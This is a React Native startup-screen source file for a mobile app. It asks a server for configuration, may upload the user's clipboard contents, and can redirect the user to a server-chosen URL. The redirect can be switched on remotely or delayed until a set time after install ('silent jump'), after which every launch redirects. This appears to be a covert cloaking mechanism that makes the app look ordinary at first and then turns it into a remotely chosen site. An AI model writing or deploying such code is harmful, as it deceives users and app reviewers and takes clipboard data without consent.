import React, { useCallback, useEffect, useRef, useState } from 'react';
import AsyncStorage from '@react-native-async-storage/async-storage';
import { Stack, useRouter } from 'expo-router';
import { ActivityIndicator, AppState, StyleSheet, View } from 'react-native';
import NetworkErrorScreen from '../components/common/NetworkErrorScreen';
import { initDomain } from '../services/domainSelector';
import { systemApi } from '../services/api';
import useAppStore from '../store/useAppStore';
import useLangStore from '../store/useLangStore';
import useUserStore from '../store/useUserStore';
import { isEmpty } from '../utils';
import { getInstallTime } from '../utils/storage';
import {
    OPEN_URL_DEBUG_TAG,
    OPEN_URL_KEYS,
    devLog,
    devWarn,
    getJumpFlag,
    isSupportedLinkType,
    jumpByLinkType,
    readDeferredJump,
    saveDeferredJump,
    setJumpFlag,
} from '../services/openUrlJump';

const INSTALL_FLAG_KEY = 'STAT_INSTALLED';

/**
 * 启动页 - 负责初始化和启动分流
 *
 * 启动链路（首次决策）：
 * 1) 恢复本地用户与语言状态
 * 2) 选择域名
 * 3) 请求 init
 * 4) 请求 getOpenUrl（首次决策是否跳转）
 *
 * 决策优先级：
 * - OPEN_URL_JUMPED=1：认为已命中过跳转，后续只要返回 targetUrl 就直接跳
 * - checkTime > 0：保存 OPEN_URL_DEFERRED_JUMP，进入首页，后续到点由根 layout 执行跳转
 * - checkTime <= 0：沿用 isOpen === '1' 才立即跳转
 */
export default function BootstrapScreen() {
    const router = useRouter();
    const setBootstrapBase = useAppStore((state) => state.setBootstrapBase);
    const initUser = useUserStore((state) => state.initUser);
    const initLang = useLangStore((state) => state.initLang);
    const [status, setStatus] = useState('loading');
    const [retrying, setRetrying] = useState(false);
    const isRunningRef = useRef(false);
    const initSuccessRef = useRef(false);

    const requestOpenUrl = useCallback(async (base) => {
        const h5Verify = await AsyncStorage.getItem(OPEN_URL_KEYS.JUMP_FLAG_KEY).catch(() => '') ?? '';
        devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: start', { h5Verify, readClipboard: base?.readClipboard });

        if (h5Verify === '1') {
            devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: jumped=1, request with empty clipboard');
            return systemApi.getOpenUrl('', h5Verify);
        }

        // init 返回允许读剪贴板时，才携带剪贴板内容请求 getOpenUrl
        if (base?.readClipboard === '1') {
            try {
                const Clipboard = require('expo-clipboard');
                const clipboardContent = await Clipboard.getStringAsync();
                devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: with clipboard', { len: (clipboardContent ?? '').length });
                return systemApi.getOpenUrl(clipboardContent ?? '', h5Verify);
            } catch {
                // 读取剪切板失败时回退到空内容
                devWarn(OPEN_URL_DEBUG_TAG, 'getOpenUrl: clipboard read failed, fallback empty');
            }
        }

        devLog(OPEN_URL_DEBUG_TAG, 'getOpenUrl: request with empty clipboard');
        return systemApi.getOpenUrl('', h5Verify);
    }, []);

    const finishToHome = useCallback(() => {
        initSuccessRef.current = true;
        devLog(OPEN_URL_DEBUG_TAG, 'route: replace /home');
        router.replace('/home');
    }, [router]);

    const doJump = useCallback(async (linkType, targetUrl) => {
        const type = await jumpByLinkType({ router, linkType, targetUrl });
        if (type === 'webview') {
            initSuccessRef.current = true;
            return true;
        }
        if (type === 'external') {
            finishToHome();
            return true;
        }
        return false;
    }, [finishToHome, router]);

    const handleOpenUrl = useCallback(async (res, base) => {
        const data = res?.data;
        if (isEmpty(data)) {
            devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: empty data');
            return false;
        }

        const { fingerprint, isOpen, linkType, targetUrl } = data;
        if (isEmpty(targetUrl)) {
            devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: empty targetUrl', { isOpen, linkType });
            return false;
        }

        const jumped = await getJumpFlag();

        if (jumped === '1') {
            // 本地已有命中标记时，只要返回 targetUrl 就直接分流
            devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: jumped=1, jump now', { linkType, targetUrl });
            return doJump(linkType, targetUrl);
        }

        const checkTimeSeconds = Number(base?.checkTime ?? 0);
        const normalizedLinkType = String(linkType ?? '');
        const canJump = isSupportedLinkType(normalizedLinkType);

        // 静默跳转：首次决策只负责写入 deferred；到点后由根 layout 再请求一次 getOpenUrl 获取最新目标并跳转
        if (Number.isFinite(checkTimeSeconds) && checkTimeSeconds > 0 && canJump) {
            const installTimeSeconds = await getInstallTime();
            const triggerAtMs = (Math.floor(installTimeSeconds) + Math.floor(checkTimeSeconds)) * 1000;
            const remainingMs = triggerAtMs - Date.now();
            devLog(OPEN_URL_DEBUG_TAG, 'silent decision', {
                installTimeSeconds,
                checkTimeSeconds,
                nowMs: Date.now(),
                triggerAtMs,
                remainingMs,
                isOpen,
                linkType: normalizedLinkType,
            });

            if (remainingMs > 0) {
                await saveDeferredJump({
                    triggerAtMs,
                    linkType: normalizedLinkType,
                    targetUrl,
                    fingerprint: fingerprint ?? '',
                });
                devLog(OPEN_URL_DEBUG_TAG, 'saved deferred jump', { triggerAtMs, linkType: normalizedLinkType, targetUrl });
                return false;
            }

            // 已到触发时间，直接执行跳转
            if (fingerprint) {
                systemApi.fingerprintDelete(fingerprint).catch(() => { });
            }
            await setJumpFlag();
            devLog(OPEN_URL_DEBUG_TAG, 'silent decision: time reached, jump now', { linkType: normalizedLinkType, targetUrl });
            return doJump(normalizedLinkType, targetUrl);
        }

        // 非静默：仍沿用 isOpen === '1' 才立即跳转
        if (isOpen === '1') {
            if (!canJump) {
                devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: isOpen=1 but invalid linkType, no jump', { linkType });
                return false;
            }

            if (fingerprint) {
                systemApi.fingerprintDelete(fingerprint).catch(() => { });
            }
            await setJumpFlag();
            devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: isOpen=1 immediate, jump now', { linkType: normalizedLinkType, targetUrl });
            return doJump(normalizedLinkType, targetUrl);
        }

        devLog(OPEN_URL_DEBUG_TAG, 'handleOpenUrl: isOpen!=1, no jump', { isOpen, linkType });
        return false;
    }, [doJump]);

    const runBootstrap = useCallback(async () => {
        if (isRunningRef.current) {
            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: skip, already running');
            return;
        }

        isRunningRef.current = true;
        // 重试和首屏进入统一走 loading 态
        setStatus('loading');
        devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: start');

        try {
            // 启动页统一负责恢复本地用户和语言状态
            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: initUser/initLang');
            await Promise.all([initUser(), initLang()]);
            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: initUser/initLang done');

            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: initDomain');
            await initDomain();
            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: initDomain done');

            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: api.init');
            const initRes = await systemApi.init();
            const base = initRes?.data?.base ?? null;
            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: api.init done', { checkTime: base?.checkTime, readClipboard: base?.readClipboard });
            // 将 init 返回的基础配置暂存起来，供 home 进入后补拉语言包
            setBootstrapBase(base);

            const h5Verify = await AsyncStorage.getItem(OPEN_URL_KEYS.JUMP_FLAG_KEY).catch(() => '') ?? '';
            if (h5Verify !== '1') {
                // 已有静默跳转决策时，不需要重复请求 getOpenUrl
                const deferred = await readDeferredJump();
                if (deferred) {
                    devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: deferred exists, skip getOpenUrl and go home', deferred);
                    finishToHome();
                    return;
                }
            }

            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: api.getOpenUrl');
            const openUrlRes = await requestOpenUrl(base);
            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: api.getOpenUrl done', {
                hasData: !!openUrlRes?.data,
                isOpen: openUrlRes?.data?.isOpen,
                linkType: openUrlRes?.data?.linkType,
                hasTargetUrl: !!openUrlRes?.data?.targetUrl,
            });

            const didJump = await handleOpenUrl(openUrlRes, base);
            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: decision done', { didJump });
            if (!didJump) {
                // 未命中任何策略时，才进入 App 内部首页
                finishToHome();
            }
        } catch (e) {
            devWarn(OPEN_URL_DEBUG_TAG, 'bootstrap: failed, show error', e);
            setStatus('error');
        } finally {
            isRunningRef.current = false;
            setRetrying(false);
            devLog(OPEN_URL_DEBUG_TAG, 'bootstrap: end');
        }
    }, [finishToHome, handleOpenUrl, initLang, initUser, requestOpenUrl, setBootstrapBase]);

    useEffect(() => {
        devLog(OPEN_URL_DEBUG_TAG, 'BootstrapScreen: mount');
        // 首次安装时上报一次 install 事件
        AsyncStorage.getItem(INSTALL_FLAG_KEY).then((installed) => {
            if (!installed) {
                devLog(OPEN_URL_DEBUG_TAG, 'stat: install');
                systemApi.sendStat('install')
                    .then(() => AsyncStorage.setItem(INSTALL_FLAG_KEY, '1'))
                    .catch(() => { });
            }
        }).catch(() => { });

        runBootstrap();

        const appStateListener = AppState.addEventListener('change', (nextState) => {
            devLog(OPEN_URL_DEBUG_TAG, 'AppState change', { nextState });
            // 首次安装等场景下，系统授权弹窗可能打断启动链路，回前台后允许再触发一次
            if (nextState === 'active' && !initSuccessRef.current) {
                devLog(OPEN_URL_DEBUG_TAG, 'AppState active, rerun bootstrap');
                runBootstrap();
            }
        });

        return () => {
            devLog(OPEN_URL_DEBUG_TAG, 'BootstrapScreen: unmount');
            appStateListener.remove();
        };
    }, [runBootstrap]);

    return (
        <>
            <Stack.Screen options={{ headerShown: false }} />
            <View style={styles.container}>
                <ActivityIndicator size="large" color="#3961FB" />
            </View>
            {status === 'error' && (
                <NetworkErrorScreen
                    loading={retrying}
                    onPress={() => {
                        devLog(OPEN_URL_DEBUG_TAG, 'ui: retry pressed');
                        setRetrying(true);
                        runBootstrap();
                    }}
                />
            )}
        </>
    );
}

const styles = StyleSheet.create({
    container: {
        flex: 1,
        backgroundColor: '#FFFFFF',
        justifyContent: 'center',
        alignItems: 'center',
    },
});
